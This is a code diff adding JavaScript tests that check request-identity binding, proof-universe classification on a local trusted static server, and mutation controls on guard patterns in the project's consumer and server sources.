+test("F2-GOV-09-F18 binds a WebKit response wrapper to its browser-correlated request identity", () => {
+  assert.equal(typeof trustedConsumer.resolveTrustedResponseIdentity, "function", "response identity resolver is absent");
+  const request = { universe: "BROWSER_CORRELATED", identityOwner: "consumer", requestId: "1".repeat(64), url: "http://127.0.0.1:4173/index.html", route: "index.html", range: null };
+  assert.equal(trustedConsumer.resolveTrustedResponseIdentity({
+    engine: "webkit",
+    metadata: undefined,
+    serverRequestId: request.requestId,
+    universe: "BROWSER_CORRELATED",
+    identityOwner: "consumer",
+    browserRequests: [request],
+  }), request, "a fresh Playwright response wrapper lost the existing consumer-owned identity");
+  assert.throws(() => trustedConsumer.resolveTrustedResponseIdentity({
+    engine: "webkit",
+    metadata: undefined,
+    serverRequestId: "2".repeat(64),
+    universe: "BROWSER_CORRELATED",
+    identityOwner: "consumer",
+    browserRequests: [request],
+  }), /unknown.*browser-correlated|identity/i);
+});
+
+test("F2-GOV-09-F18 server classifies proof universes only from measured capability structure", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f18-server-"));
+  const htmlBytes = Buffer.from("<!doctype html><title>trusted</title>");
+  await write(directory, "index.html", htmlBytes);
+  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "index.html", sha256: sha256ForTest(htmlBytes) }], 0);
+  try {
+    const window = server.openJournalWindow();
+    const browserHeaders = window.authorizeHeaders({ "x-branct-trusted-request-id": "1".repeat(64) });
+    const browserResponse = await fetch(`${server.origin}/index.html`, { headers: browserHeaders });
+    assert.equal(browserResponse.status, 200);
+    assert.equal(browserResponse.headers.get("x-branct-trusted-universe"), "BROWSER_CORRELATED");
+    const cookie = browserResponse.headers.get("set-cookie")?.split(";", 1)[0];
+    assert.ok(cookie, "server continuation cookie was not issued");
+    const internalResponse = await fetch(`${server.origin}/index.html`, { headers: { cookie } });
+    assert.equal(internalResponse.status, 200);
+    assert.equal(internalResponse.headers.get("x-branct-trusted-universe"), "SERVER_INTERNAL");
+    window.beginQuiescence();
+    window.seal();
+    const snapshot = window.snapshot();
+    assert.deepEqual(snapshot.records.map(({ universe, identityOwner }) => ({ universe, identityOwner })), [
+      { universe: "BROWSER_CORRELATED", identityOwner: "consumer" },
+      { universe: "SERVER_INTERNAL", identityOwner: "server" },
+    ]);
+  } finally {
+    await server.close();
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("F2-GOV-09-F18 mutation controls keep separation, status, cardinality and observation authority load-bearing", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const staticServer = workingFile(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8");
+  const guards = (consumerSource, serverSource) => {
+    assert.match(serverSource, /BROWSER_CORRELATED/);
+    assert.match(serverSource, /SERVER_INTERNAL/);
+    assert.match(serverSource, /headerAuthorized\s*\?\s*"BROWSER_CORRELATED"\s*:\s*"SERVER_INTERNAL"/);
+    assert.match(consumerSource, /assertTrustedProofUniverses/);
+    assert.match(consumerSource, /trusted local response status 0 is invalid/);
+    assert.match(consumerSource, /assertTrustedLocalResponseStatus\(entry\.status, entry\.url\)/);
+    assert.match(consumerSource, /proof universes are not disjoint/);
+    assert.match(consumerSource, /identities\.has\(entry\.requestId\)/);
+    assert.match(consumerSource, /journals\.has\(entry\.journalId\)/);
+    assert.match(consumerSource, /browserJournal\.length \+ internalJournal\.length/);
+    assert.match(consumerSource, /for \(const field of \["universe", "identityOwner", "journalId", "rejectionId", "url", "route", "range", "status", "resourceType"\]\)/);
+    assert.match(consumerSource, /recordBrowserCorrelatedResponse\(localResponses, observation, engine\)/);
+    assert.match(consumerSource, /universe === "SERVER_INTERNAL"\) recordTrustedResponseObservation\(internalObservations, observation, engine\)/);
+    assert.doesNotMatch(consumerSource, /engine\s*===\s*["']webkit["'].*SERVER_INTERNAL/);
+    assert.doesNotMatch(consumerSource, /(?:media|fixture\.webm|\.webm).*SERVER_INTERNAL/);
+  };
+  assert.doesNotThrow(() => guards(consumer, staticServer));
+  for (const [label, pattern, replacement] of [
+    ["remove structural separation", 'headerAuthorized ? "BROWSER_CORRELATED" : "SERVER_INTERNAL"', '"BROWSER_CORRELATED"'],
+    ["accept status zero", "assertTrustedLocalResponseStatus(entry.status, entry.url)", "void entry.status"],
+    ["allow duplicate identity", "identities.has(entry.requestId)", "false"],
+    ["allow duplicate journal", "journals.has(entry.journalId)", "false"],
+    ["accept extra journal record", "browserJournal.length + internalJournal.length", "sealedSnapshot.records.length"],
+    ["ignore divergent rejection identity", 'for (const field of ["universe", "identityOwner", "journalId", "rejectionId", "url", "route", "range", "status", "resourceType"])', 'for (const field of ["universe", "identityOwner", "journalId", "url", "route", "range", "status", "resourceType"])'],
+    ["duplicate browser evidence", "recordBrowserCorrelatedResponse(localResponses, observation, engine)", "localResponses.push(observation)"],
+    ["duplicate internal evidence", "recordTrustedResponseObservation(internalObservations, observation, engine)", "internalObservations.push(observation)"],
+  ]) {
+    const source = label === "remove structural separation" ? staticServer : consumer;
+    const mutated = source.replace(pattern, replacement);
+    assert.notEqual(mutated, source, `${label} mutation did not alter bytes`);
+    assert.throws(() => guards(label === "remove structural separation" ? consumer : mutated, label === "remove structural separation" ? mutated : staticServer), /input did not match/i, `${label} mutation escaped`);
+  }
+  for (const allowlist of ['engine === "webkit" && universe === "SERVER_INTERNAL"', 'route.endsWith(".webm") && universe === "SERVER_INTERNAL"']) {
+    const mutated = `${consumer}\nif (${allowlist}) void 0;`;
+    assert.throws(() => guards(mutated, staticServer), /input was expected to not match/i, "a forbidden engine or media allowlist escaped");
+  }
 });
